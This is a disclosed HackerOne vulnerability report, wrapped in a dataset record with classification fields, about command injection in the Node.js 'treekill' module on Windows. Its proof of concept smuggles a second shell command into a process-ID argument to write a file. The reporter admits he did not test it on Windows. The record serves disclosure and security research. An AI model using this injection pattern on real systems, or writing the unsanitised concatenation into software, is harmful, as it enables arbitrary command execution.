{
  "reported_to": "Node.js third-party modules",
  "reported_by": "mik317 ",
  "title": "[treekill] RCE via insecure command concatenation (only Windows)",
  "content": "\nI would like to report a RCE issue in the treekill module.\nIt allows to execute arbitrary commands remotely inside the victim's PC\nModule\nmodule name: treekill\nversion: 1.0.0\nnpm page: https://www.npmjs.com/package/treekill\nModule Description\ntreekill process and it's all children and child offspring children.\nModule Stats\n[N/A] downloads in the last day\n[106] downloads in the last week\n[N/A] downloads in the last month\nVulnerability Description\nThe issue occurs because a user input is concatenated inside a command that will be executed without any check. The issue arises here: https://github.com/node-modules/treekill/blob/master/index.js#L32\n(as you can see, the Linux part is sanitized, while the Win one no ... it simply uses the + operand to concatenate the input)\nSteps To Reproduce:\nCreate the following PoC file:\nCode 90 Bytes\n1// poc.js\n2var kill = require('treekill');\n3kill('3333332 & echo \"HACKED\" > HACKED.txt & ');\nExecute the following commands in terminal:\nCode 140 Bytes\n1npm i tree-kill # Install affected module\n2dir # Check *HACKED.txt* doesn't exist\n3node poc.js #  Run the PoC\n4dir # Now *HACKED.txt* exists :)\nThe HACKED.txt has been created\nPatch\nDon't concatenate commands using insecure user's inputs :)\nSupporting Material/References:\n[OPERATING SYSTEM VERSION]: Kali Linux\n\n\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nPS: Note I'm working on a LInux machine, so I'm not sure if the syntax used to inject the command is successfull ... anyway, the issue is possible, as you can see from the code. If you'll not be able to reproduce the PoC, let me know and I'll switch on a Win machine in order to make working the PoC.\nImpact\nRCE on treekill via insecure command concatenation\n\n",
  "severity": [
    7.3,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Code Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1575506700,
  "report_url": "https://hackerone.com/reports/703415",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Install the vulnerable module: npm i tree-kill"
    ],
    [
      2,
      "Create a PoC file (poc.js) with the following content:\nvar kill = require('treekill');\nkill('3333332 & echo \"HACKED\" > HACKED.txt & ');"
    ],
    [
      3,
      "Run the PoC: node poc.js"
    ],
    [
      4,
      "Verify the attack by checking if HACKED.txt was created: dir"
    ]
  ],
  "vuln_description": "The treekill module for Node.js is vulnerable to Remote Code Execution (RCE) on Windows due to insecure command concatenation. User input is directly concatenated into a command that is executed without proper sanitization, allowing an attacker to inject arbitrary commands.",
  "reason": "The vulnerability is straightforward to discover as it involves a common pattern of insecure command concatenation. The attack does not require complex interactions or understanding of multiple components. The vulnerable code is easily identifiable in the source file, and the exploitation follows a typical command injection pattern.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": true
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves command injection via insecure command concatenation in a Node.js module, which is not related to authentication or authorization boundaries within an application. The proposed methodologies focus on detecting authN/authZ issues by analyzing user sessions, actions, and resource IDs within the same application context, not command injection vulnerabilities in third-party modules.",
    "is_detectable": false
  }
}